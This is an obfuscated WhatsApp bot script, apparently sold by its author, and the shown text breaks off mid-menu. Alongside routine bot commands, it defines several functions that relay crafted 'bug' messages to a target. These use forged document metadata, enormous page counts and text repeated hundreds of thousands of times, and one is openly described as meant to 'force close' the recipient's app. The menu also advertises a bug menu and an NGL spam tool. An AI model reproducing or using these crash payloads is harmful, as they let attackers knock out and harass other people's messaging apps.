/*
SCRIPT ZANGETSU V1.0 - Ichigo DEV
BUY NO ENC PM : wa.me/6285808282968
*/
require("../setting/config");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");
const fetch = require("node-fetch");
const os = require("os");
const path = require("path");
const cp = require("child_process");
const {
  promisify
} = require("util");
const util = require("util");
const sharp = require("sharp");
const moment = require("moment-timezone");
const {
  spawn,
  exec,
  execSync
} = require("child_process");
const {
  color
} = require("./lib/color");
const {
  default: baileys,
  proto,
  jidNormalizedUser,
  generateWAMessage,
  generateWAMessageFromContent,
  getContentType,
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
module.exports = cigo = async (_0x3ac7f7, _0x2b94ac, _0x2d3151, _0xe7e36) => {
  try {
    if (global.db.data == null) {
      await loadDatabase();
    }
    require("./lib/database/schema")(_0x2b94ac);
    const _0x3b1f6a = global.db.data.chats[_0x2b94ac.chat];
    const _0x5e9889 = global.db.data.users[_0x2b94ac.sender];
    const _0x4cb777 = global.db.data.settings;
    const _0xc52e05 = _0x2b94ac.mtype === "conversation" ? _0x2b94ac.message.conversation : _0x2b94ac.mtype === "imageMessage" ? _0x2b94ac.message.imageMessage.caption : _0x2b94ac.mtype === "videoMessage" ? _0x2b94ac.message.videoMessage.caption : _0x2b94ac.mtype === "extendedTextMessage" ? _0x2b94ac.message.extendedTextMessage.text : _0x2b94ac.mtype === "buttonsResponseMessage" ? _0x2b94ac.message.buttonsResponseMessage.selectedButtonId : _0x2b94ac.mtype === "listResponseMessage" ? _0x2b94ac.message.listResponseMessage.singleSelectReply.selectedRowId : _0x2b94ac.mtype === "templateButtonReplyMessage" ? _0x2b94ac.message.templateButtonReplyMessage.selectedId : _0x2b94ac.mtype === "interactiveResponseMessage" ? JSON.parse(_0x2b94ac.msg.nativeFlowResponseMessage.paramsJson).id : _0x2b94ac.mtype === "messageContextInfo" ? _0x2b94ac.message.buttonsResponseMessage?.selectedButtonId || _0x2b94ac.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x2b94ac.text : "";
    const _0x594708 = _0x2b94ac.key.fromMe ? _0x3ac7f7.user.id.split(":")[0] + "@s.whatsapp.net" || _0x3ac7f7.user.id : _0x2b94ac.key.participant || _0x2b94ac.key.remoteJid;
    const _0x51981c = _0x594708.split("@")[0];
    const _0x1e7f1c = typeof _0x2b94ac.text === "string" ? _0x2b94ac.text : "";
    var _0x237505 = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0xc52e05) ? _0xc52e05.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
    const _0x301112 = _0x2b94ac.key.remoteJid;
    const _0x5125fc = _0x301112.endsWith("@g.us");
    const _0x4986a1 = JSON.parse(fs.readFileSync("./start/lib/database/owner.json"));
    const _0x35f08c = JSON.parse(fs.readFileSync("./start/lib/database/prem.json"));
    const _0x573d81 = _0x35f08c.includes(_0x2b94ac.sender);
    const _0x7f764d = await _0x3ac7f7.decodeJid(_0x3ac7f7.user.id);
    const _0x42d71f = [_0x7f764d, ..._0x4986a1, ...global.owner].map(_0x6d4b00 => _0x6d4b00.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x2b94ac.sender);
    const _0x4c11a5 = _0xc52e05.startsWith(_0x237505);
    const _0x106ae3 = _0xc52e05.replace(_0x237505, "").trim().split(/ +/).shift().toLowerCase();
    const _0xd19836 = _0xc52e05.trim().split(/ +/).slice(1);
    const _0x47224b = _0x2b94ac.pushName || "No Name";
    const _0x4e0d9e = q = _0xd19836.join(" ");
    const _0x461c83 = _0x2b94ac.quoted ? _0x2b94ac.quoted : _0x2b94ac;
    const _0x2d34b9 = (_0x461c83.msg || _0x461c83).mimetype || "";
    const _0x2c5853 = _0x461c83.msg || _0x461c83;
    const _0x3d5efb = /image|video|sticker|audio/.test(_0x2d34b9);
    const _0x512754 = _0x5125fc ? await _0x3ac7f7.groupMetadata(_0x2b94ac.chat).catch(() => {}) : "";
    const _0x55d153 = _0x5125fc ? _0x512754.owner : "";
    const _0x27e567 = _0x5125fc ? _0x512754.subject : "";
    const _0x10ba0c = _0x5125fc ? await _0x512754.participants : "";
    const _0x23df62 = _0x5125fc ? _0x10ba0c.filter(_0x62bf => _0x62bf.admin !== null).map(_0x441ace => _0x441ace.id) : "";
    const _0x5596ec = _0x5125fc ? _0x512754.participants : "";
    const _0x425124 = _0x5125fc ? _0x23df62.includes(_0x2b94ac.sender) : false;
    const _0x1626a8 = _0x5125fc ? _0x23df62.includes(_0x7f764d) : false;
    const _0x6d90f0 = _0x5125fc ? _0x23df62.includes(_0x7f764d) : false;
    const _0x96bf6f = _0x5125fc ? _0x23df62.includes(_0x2b94ac.sender) : false;
    const _0xa2f9e3 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    let _0xcf707d;
    if (_0xa2f9e3 >= "19:00:00" && _0xa2f9e3 < "23:59:00") {
      _0xcf707d = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦";
    } else if (_0xa2f9e3 >= "15:00:00" && _0xa2f9e3 < "19:00:00") {
      _0xcf707d = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞";
    } else if (_0xa2f9e3 >= "11:00:00" && _0xa2f9e3 < "15:00:00") {
      _0xcf707d = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠";
    } else if (_0xa2f9e3 >= "06:00:00" && _0xa2f9e3 < "11:00:00") {
      _0xcf707d = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢";
    } else {
      _0xcf707d = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡";
    }
    ;
    const _0x247811 = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const _0x3a2a21 = moment.tz("Asia/Jakarta").format("HH : mm : ss");
    const _0x260f27 = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const _0x1c31f0 = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const _0x1df74f = fs.readFileSync("./start/lib/media/peler.jpg");
    const _0x45f5a0 = ["https://files.catbox.moe/jooyw3.jpg", "https://files.catbox.moe/nie40c.jpg", "https://files.catbox.moe/a6ms5h.jpg"];
    function _0x26119b() {
      const _0x51b4f5 = Math.floor(Math.random() * _0x45f5a0.length);
      return _0x45f5a0[_0x51b4f5];
    }
    const _0x347312 = _0x26119b();
    const {
      smsg: _0x4ddb04,
      sendGmail: _0x1472d9,
      formatSize: _0x445956,
      isUrl: _0x384b4a,
      generateMessageTag: _0x4a7307,
      getBuffer: _0x58e472,
      getSizeMedia: _0x2c03f3,
      runtime: _0x4b6c12,
      fetchJson: _0x3e1616,
      sleep: _0x3a4302
    } = require("./lib/myfunction");
    const {
      imageToWebp: _0x5f3940,
      videoToWebp: _0x809945,
      writeExifImg: _0x131d5a,
      writeExifVid: _0x454194,
      addExif: _0x1eb1f9
    } = require("./lib/exif");
    const {
      ytdl: _0x248402
    } = require("./lib/scrape/scrape-ytdl");
    const {
      spamngl: _0x4a077b
    } = require("./lib/scrape/scrape-ngl");
    const {
      pindl: _0x4787cd
    } = require("./lib/scrape/scrape-pindl");
    const {
      tiktok: _0x1df09b
    } = require("./lib/scrape/scrape-tiktok");
    const {
      igdl: _0x3824da
    } = require("./lib/scrape/scrape-igdl");
    const {
      luminai: _0x3364d4
    } = require("./lib/scrape/scrape-luminai");
    const _0xaee1b3 = require("./lib/uploadImage");
    const _0x58396f = async (_0xdd7a98, _0x1f2eeb) => {
      _0x3ac7f7.sendMessage(_0xdd7a98, {
        react: {
          text: _0x1f2eeb,
          key: _0x2b94ac.key
        }
      });
    };
    if (_0x2b94ac.isGroup) {
      if (_0xc52e05.includes("@6281351692548")) {
        _0x58396f(_0x2b94ac.chat, "❓");
      }
    }
    if (_0x2b94ac.message) {
      if (_0x4c11a5 && !_0x2b94ac.isGroup) {
        console.log(chalk.black(chalk.bgHex("#ff5e78").bold("\n🌟 " + _0xcf707d + " 🌟")));
        console.log(chalk.white(chalk.bgHex("#4a69bd").bold("🚀 Ada Pesan, Om! 🚀")));
        console.log(chalk.black(chalk.bgHex("#fdcb6e")("📅 DATE: " + new Date().toLocaleString() + "\n💬 MESSAGE: " + (_0x2b94ac.body || _0x2b94ac.mtype) + "\n🗣️ SENDERNAME: " + _0x47224b + "\n👤 JIDS: " + _0x2b94ac.sender)));
      } else if (_0x2b94ac.isGroup) {
        console.log(chalk.black(chalk.bgHex("#ff5e78").bold("\n🌟 " + _0xcf707d + " 🌟")));
        console.log(chalk.white(chalk.bgHex("#4a69bd").bold("🚀 Ada Pesan, Om! 🚀")));
        console.log(chalk.black(chalk.bgHex("#fdcb6e")("📅 DATE: " + new Date().toLocaleString() + "\n💬 MESSAGE: " + (_0x2b94ac.body || _0x2b94ac.mtype) + "\n🗣️ SENDERNAME: " + _0x47224b + "\n👤 JIDS: " + _0x2b94ac.sender + "\n🔍 MESS LOCATION: " + _0x27e567)));
      }
    }
    if (_0x2b94ac.mtype.includes("imageMessage") && _0x2b94ac.isGroup) {
      try {
        const _0x29fc41 = _0x512754.participants.some(_0x4b362a => _0x4b362a.id === _0x7f764d && _0x4b362a.admin);
        if (!_0x29fc41) {
          console.log("Bot bukan admin, tidak dapat memproses permintaan.");
          return;
        }
        const _0x1edacd = _0x2b94ac.quoted ? _0x2b94ac.quoted : _0x2b94ac;
        if (!_0x1edacd || !_0x1edacd.message.imageMessage) {
          console.error("Pesan tidak memiliki imageMessage");
          return;
        }
        const _0x315aca = await _0x1edacd.download();
        if (!_0x315aca) {
          console.error("Gagal mengunduh media");
          return;
        }
        const _0x1ecbf3 = _0x1edacd.message.imageMessage.mimetype;
        const _0x339314 = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0x1ecbf3);
        const _0x1bb6ad = require("./lib/uploadFile");
        const _0x240c6c = await (_0x339314 ? _0xaee1b3 : _0x1bb6ad)(_0x315aca);
        if (!_0x240c6c) {
          console.error("Gagal mengunggah media");
          return;
        }
        const _0x951cfd = await fetch("https://api.tioprm.eu.org/nsfwdetector?url=" + _0x240c6c);
        const _0x3d7614 = await _0x951cfd.json();
        const _0x485891 = _0x3d7614.result.labelName;
        const _0x49201e = _0x3d7614.result.labelId;
        if (_0x485891.toLowerCase() === "porn") {
          const _0x5d7b4f = "*PORN DETECTED*\n\n> Status: " + _0x485891 + "\n> Label ID: " + _0x49201e + "\n\naction: delete the image";
          await _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: _0x5d7b4f
          }, {
            quoted: _0x2b94ac
          });
          await _0x3ac7f7.deleteMessage(_0x2b94ac.chat, _0x2b94ac.key);
        }
      } catch (_0x12df5f) {
        console.error("Error memproses deteksi gambar:", _0x12df5f);
      }
    }
    async function _0x36bf8d(_0x586531) {
      _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
        text: _0x586531,
        contextInfo: {
          mentionedJid: [_0x2b94ac.sender],
          externalAdReply: {
            showAdAttribution: true,
            isForwarded: true,
            containsAutoReply: true,
            title: "  🩸⃟𒆜𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔╳🐦‍🔥\n",
            body: "",
            previewType: "VIDEO",
            thumbnailUrl: _0x347312,
            thumbnail: "",
            sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
          }
        }
      }, {
        quoted: _0x2b94ac
      });
    }
    const _0x38179e = _0x53c474 => {
      let _0x33527 = {
        url: _0x347312,
        type: "image/jpeg"
      };
      let _0xde9c56 = "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17";
      let _0x81333 = {
        externalAdReply: {
          showAdAttribution: true,
          title: "  🩸⃟𒆜𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔⃟╳🐦‍🔥\n",
          body: "",
          description: "Now Playing ....",
          mediaType: 2,
          thumbnailUrl: _0x33527.url,
          mediaUrl: _0xde9c56
        }
      };
      _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
        contextInfo: _0x81333,
        mimetype: "audio/mp4",
        audio: _0x53c474
      }, {
        quoted: _0x2b94ac
      });
    };
    function _0x4e7d86(_0x3a8b51) {
      return "" + Math.floor(Math.random() * 10000) + _0x3a8b51;
    }
    async function _0x51f489(_0x41e467, _0x3bcf40, _0x215758) {
      try {
        let _0xfe4495;
        if (_0x41e467.startsWith("data:")) {
          const _0x1cc4e0 = _0x41e467.split(",")[1];
          _0xfe4495 = Buffer.from(_0x1cc4e0, "base64");
        } else {
          const _0x1728d7 = await axios.get(_0x41e467, {
            responseType: "arraybuffer"
          });
          _0xfe4495 = Buffer.from(_0x1728d7.data, "binary");
        }
        const _0x3084aa = await sharp(_0xfe4495).resize(512, 512, {
          fit: "contain",
          background: {
            r: 255,
            g: 255,
            b: 255,
            alpha: 0
          }
        }).webp({
          quality: 70
        }).toBuffer();
        const _0x38091f = await _0x1eb1f9(_0x3084aa, global.packname, global.author);
        const _0x3f70a9 = _0x4e7d86(".webp");
        fs.writeFileSync(_0x3f70a9, _0x3084aa);
        await _0x3bcf40.sendMessage(_0x215758.chat, {
          sticker: _0x38091f,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚅𝟷.𝟶",
              mediaType: 3,
              renderLargerThumbnail: false,
              thumbnailUrl: _0x347312,
              sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
            }
          }
        }, {
          quoted: _0x215758
        });
        fs.unlinkSync(_0x3f70a9);
      } catch (_0x104395) {
        console.error("Error creating sticker:", _0x104395);
        _0x36bf8d("Terjadi kesalahan saat membuat stiker. Coba lagi nanti.");
      }
    }
    async function _0x1e7a0c(_0x5520ac, _0x4705e3, _0x49181c = true) {
      await _0x3ac7f7.relayMessage(_0x5520ac, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "ichigo",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: _0x4705e3
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐈'𝐦 𝐙𝐚𝐧𝐠𝐞𝐭𝐬𝐮🥶" + "ꦾ".repeat(50000) + "@1".repeat(90000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: [_0x2b94ac.sender],
                forwardingScore: 99999,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "Ichigo",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, _0x49181c ? {
        participant: {
          jid: _0x5520ac
        }
      } : {});
      console.log(chalk.green("Send Bug By 𝐢𝐜𝐡𝐢𝐠𝐨𝐃𝐄𝐕"));
    }
    async function _0x1c0427(_0x2a1b80) {
      let _0x531e6a = "😂⃟⃟⃟⃟⃚ 𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐃𝐎𝐂𝄽⃟⃟⃟🇮🇩";
      await _0x3ac7f7.relayMessage(_0x2a1b80, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999",
                  pageCount: 9999999999999,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: _0x531e6a,
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                hasMediaAttachment: true
              },
              body: {
                text: "😂⃟⃟⃟⃟⃚ 𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐃𝐎𝐂𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(100000) + "@1".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "BaraXSENTRY"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x2a1b80
        }
      });
    }
    ;
    async function _0x495651(_0x2cefc3, _0x35369c) {
      try {
        const _0x4351b1 = {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "𝐈𝐂𝐇𝐈𝐆𝐎 𝐃𝐄𝐕 - This is a brutal message intended to force close!"
                },
                header: {
                  hasMediaAttachment: true,
                  locationMessage: {}
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "force_call_permission",
                    buttonParamsJson: JSON.stringify({
                      largeData: "x".repeat(999999)
                    })
                  }]
                }
              }
            }
          }
        };
        const _0x33717e = await generateWAMessageFromContent(_0x2cefc3, proto.Message.fromObject(_0x4351b1), {
          userJid: _0x2cefc3,
          quoted: _0x35369c || undefined
        });
        const _0x47668d = {
          key: {
            remoteJid: _0x2cefc3,
            fromMe: false,
            participant: "0@s.whatsapp.net"
          },
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Sent",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "𝐈𝐂𝐇𝐈 𝐃𝐞𝐯",
                paramsJson: JSON.stringify({
                  screen_2_OptIn_0: true,
                  screen_2_OptIn_1: true,
                  screen_1_Dropdown_0: "ModsExecute",
                  screen_1_DatePicker_1: "1028995200000",
                  screen_1_TextInput_2: "czazxvoid@Akmal.id",
                  screen_1_TextInput_3: "94643116",
                  screen_0_TextInput_0: "radio - buttons" + "".repeat(99999),
                  screen_0_TextInput_1: "*🩸⃟𒆜𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 WAR😂⃟╳🐦‍🔥*",
                  screen_0_Dropdown_2: "001-Grimgar",
                  screen_0_RadioButtonsGroup_3: "0_true",
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            }
          }
        };
        await _0x3ac7f7.relayMessage(_0x2cefc3, _0x33717e.message, {
          participant: {
            jid: _0x2cefc3
          },
          messageId: _0x33717e.key.id
        });
        console.log("Brutal message sent to " + _0x2cefc3 + " successfully.");
      } catch (_0x73f526) {
        console.error("Failed to send message to " + _0x2cefc3 + ":", _0x73f526);
      }
    }
    switch (_0x106ae3) {
      case "menu":
        {
          let _0x38c7df = "Hi @" + _0x2b94ac.sender.split("@")[0] + " , Saya adalah bot whatsapp yang bernama *𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔* Saya di ciptakan dan di kembangkan oleh developer saya yang bernama 𝐈𝐂𝐇𝐈𝐆𝐎 𝗗𝗲𝘃\n\n▀█ █▀▀ ▀█▀ ▀█ █░█\n█▄ █▄█ ░█░ █▄ █▄█\n ▢ 𝙉𝘼𝙈𝘼 𝘽𝙊𝙏𝙕 : " + global.botname + "\n ▢ 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : " + global.author + "\n ▢ 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 : " + global.version + "\n ▢ 𝙇𝙞𝙗𝙧𝙖𝙧𝙮 : WS-Baileys\n ▢ 𝙈𝙊𝘿𝙀 : " + (_0x3ac7f7.public ? "Public" : "Self") + "\n ▢ 𝙏𝙔𝙋𝙀 : case\n ▢ 𝙒𝘼𝙆𝙏𝙐 𝙒𝙄𝘽 :" + _0x3a2a21 + "\n\n𝙆𝙀𝙏𝙄𝙆 𝘾𝙊𝙈𝙈𝘼𝙉𝘿( `.𝙨𝙞𝙢𝙥𝙡𝙚` ) \n𝙐𝙉𝙏𝙐𝙆 𝙈𝙀𝙉𝘼𝙈𝙋𝙄𝙇𝙆𝘼𝙉 𝙈𝙀𝙉𝙐 𝙎𝙀𝘿𝙀𝙍𝙃𝘼𝙉𝘼\n\n𝙄𝙉𝙁𝙊 𝙎𝙀𝙇𝙀𝙉𝙂𝙆𝘼𝙋𝙉𝙔𝘼 𝘼𝘿𝘼 𝘿𝙄 𝘾𝙃\nhttps://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17\n© 𝙸𝚌𝚑𝚒𝚐𝚘 𝙳𝚎𝚟\n";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            video: {
              url: "https://files.catbox.moe/5mcofv.mp4"
            },
            caption: _0x38c7df,
            mimetype: "video/mp4",
            gifPlayback: true,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐈𝐍𝐅𝐎👑",
                newsletterJid: "120363374529648284@newsletter"
              },
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚅𝟷.𝟶",
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: _0x347312,
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "simple":
        {
          if (!_0x4c11a5) {
            return;
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🚀",
              key: _0x2b94ac.key
            }
          });
          await _0x3a4302(500);
          let _0x686fe5 = "\n▀█ █▀▀ ▀█▀ ▀█ █░█\n█▄ █▄█ ░█░ █▄ █▄█\n*「 𝙄𝙉𝙁𝙊-𝘽𝙊𝙏𝙕 」*\n*𝙉𝘼𝙈𝘼 𝘽𝙊𝙏𝙕 :* " + global.botname + "\n*𝙑𝙀𝙍𝙎𝙄𝙊𝙉 :* " + global.version + "\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 :* " + global.author + "\n*𝙒𝘼𝙆𝙏𝙐 𝙒𝙄𝘽 :* " + _0x3a2a21 + "\n*𝙈𝙊𝘿𝙀 :* " + (_0x3ac7f7.Public ? "self" : "public") + "\n\n*地𝐒𝐈𝐌𝐏𝐋𝐄 𝐌𝐄𝐍𝐔神*\n*女 " + _0x237505 + "𝙨𝙝𝙤𝙬-𝙢𝙚𝙣𝙪 [ 𝙎𝙀𝙈𝙐𝘼 𝙈𝙀𝙉𝙐 ]*\n*女 " + _0x237505 + "𝙗𝙪𝙜𝙢𝙚𝙣𝙪 [ 𝙈𝙀𝙉𝙐 𝘽𝙐𝙂 ]*\n*女 " + _0x237505 + "𝙋𝙖𝙣𝙙𝙪𝙖𝙣 [ 𝙋𝙀𝙍𝙄𝙉𝙂𝘼𝙏𝘼𝙉 ]*\n*女 " + _0x237505 + "𝙩𝙦𝙩𝙤 [ 𝙏𝙀𝙍𝙄𝙈𝘼𝙆𝘼𝙎𝙄𝙃 ]*\n";
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            video: {
              url: "https://files.catbox.moe/5mcofv.mp4"
            },
            caption: _0x686fe5,
            mimetype: "video/mp4",
            gifPlayback: true,
            contextInfo: {
              mentionedJid: [_0x2b94ac.sender],
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐙𝐀𝐍𝐆𝐄𝐓𝐒𝐔 𝐈𝐍𝐅𝐎👑",
                newsletterJid: "120363374529648284@newsletter"
              },
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: "© 𝚉𝚊𝚗𝚐𝚎𝚝𝚜𝚞 𝚅𝟷.𝟶",
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: _0x347312,
                sourceUrl: "https://whatsapp.com/channel/0029Vaul3axCHDykGBq9NJ17"
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        ;
        break;
      case "show-menu":
        {
          if (!_0x4c11a5) {
            return;
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🚀",
              key: _0x2b94ac.key
            }
          });
          await _0x3a4302(500);
          let _0x552577 = "\n▀█ █▀▀ ▀█▀ ▀█ █░█\n█▄ █▄█ ░█░ █▄ █▄█\n*「 𝙄𝙉𝙁𝙊-𝘽𝙊𝙏𝙕 」*\n*𝙉𝘼𝙈𝘼 𝘽𝙊𝙏𝙕 :* " + global.botname + "\n*𝙑𝙀𝙍𝙎𝙄𝙊𝙉 :* " + global.version + "\n*𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 :* " + global.author + "\n*𝙒𝘼𝙆𝙏𝙐 𝙒𝙄𝘽 :* " + _0x3a2a21 + "\n*𝙈𝙊𝘿𝙀 :* " + (_0x3ac7f7.Public ? "self" : "public") + "\n\n┏❐  *⌜𝐒𝐓𝐈𝐊𝐄𝐑 𝐌𝐄𝐍𝐔⌟*  ❐\n┃⭔" + _0x237505 + "𝙗𝙧𝙖𝙩\n┃⭔" + _0x237505 + "𝙨𝙩𝙞𝙘𝙠𝙚𝙧\n┗❐\n┏❐  *⌜𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔⌟*  ❐\n┃⭔" + _0x237505 + "𝙢𝙤𝙙𝙚 𝙥𝙪𝙗𝙡𝙞𝙘\n┃⭔" + _0x237505 + "𝙢𝙤𝙙𝙚 𝙨𝙚𝙡𝙛\n┃⭔" + _0x237505 + "𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧\n┃⭔" + _0x237505 + "𝙙𝙚𝙡𝙡𝙤𝙬𝙣𝙚𝙧\n┃⭔" + _0x237505 + "𝙖𝙙𝙙𝙥𝙧𝙚𝙢\n┃⭔" + _0x237505 + "𝙙𝙚𝙡𝙥𝙧𝙚𝙢\n┗❐\n┏❐  *⌜𝐆𝐑𝐔𝐏 𝐌𝐄𝐍𝐔⌟*  ❐\n┃⭔" + _0x237505 + "𝙩𝙖𝙜𝙖𝙡𝙡\n┃⭔" + _0x237505 + "𝙩𝙤𝙜𝙖𝙡\n┃⭔" + _0x237505 + "𝙩𝙖𝙜𝙢𝙚\n┗❐\n┏❐  *⌜𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔⌟*  ❐\n┃⭔" + _0x237505 + "𝙨𝙥𝙖𝙢-𝙣𝙜𝙡\n┃⭔" + _0x237505 + "𝙩𝙤𝙫𝙣\n┃⭔" + _0x237505 + "𝙜𝙚𝙩\n┃⭔" + _0x237505 + "𝙨𝙩𝙞𝙘𝙠𝙚𝙧\n┃⭔" + _0x237505 + "𝙩𝙤𝙪𝙧𝙡\n┃⭔" + _0x237505 